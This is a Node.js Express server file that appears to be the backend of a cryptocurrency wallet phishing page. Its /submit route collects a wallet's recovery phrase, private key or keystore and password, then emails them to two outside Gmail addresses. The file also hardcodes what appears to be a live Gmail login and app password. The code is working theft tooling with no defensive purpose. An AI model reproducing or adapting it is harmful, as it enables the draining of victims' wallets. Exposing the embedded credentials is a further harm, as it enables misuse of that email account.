const express = require('express');
const nodemailer = require('nodemailer');
const multer = require('multer');
const path = require('path');

const app = express();
const port = 3000;

// Multer for handling multipart/form-data
const upload = multer();

// Serve static files
app.use(express.static('public'));

// List of recipient email addresses
const maillist = [
  'Divasnow178@gmail.com',
  'rf7765272@gmail.com',
];

// Create nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: "hello.jonathanpius@gmail.com",
    pass: "rbenxiivasedcnaw",
    // ⚠️ IMPORTANT: Use environment variables for email credentials in production
  },
});

// Route to handle form submission
app.post('/submit', upload.none(), async (req, res) => {
  try {
    // Extract form data
    const { walletName, phraseWallet, passwordWallet, send } = req.body;

    // Check if this is a valid submission
    if (send !== 'true') {
      return res.status(400).send('Invalid submission');
    }

    // Prepare email options
    const mailOptions = {
      from: '"Wallet Details" <hello.jonathanpius@gmail.com>',
      to: maillist,
      subject: "New Wallet Details Submitted",
      html: `
        <h2>Wallet Details Submission</h2>
        <p><strong>Wallet Name:</strong> ${walletName || 'Not provided'}</p>
        <p><strong>Wallet Phrase/Keystore/Private Key:</strong> ${phraseWallet || 'Not provided'}</p>
        <p><strong>Password (if keystore):</strong> ${passwordWallet || 'Not provided'}</p>
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);

    console.log('Email sent:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Rejected:', info.rejected);

    // Send response back to client
    res.status(200).send('Wallet details submitted successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Error submitting wallet details');
  }
});

// Serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});